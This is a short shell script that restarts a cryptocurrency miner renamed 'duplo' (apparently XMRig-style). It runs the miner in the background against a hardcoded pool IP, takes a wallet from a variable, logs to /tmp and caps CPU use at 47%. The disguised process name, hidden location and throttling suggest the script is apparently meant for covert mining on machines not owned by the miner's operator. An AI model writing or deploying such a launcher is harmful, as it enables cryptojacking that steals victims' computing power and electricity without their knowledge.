pkill duplo
sleep 7
duplo -o 94.130.186.161:55889 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/duplo/duplo.log --donate-level=1 --print-time=90 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=47 --av=1 --variant -1
echo -e 'ALL WORKS! tail -f /tmp/duplo/duplo.log'
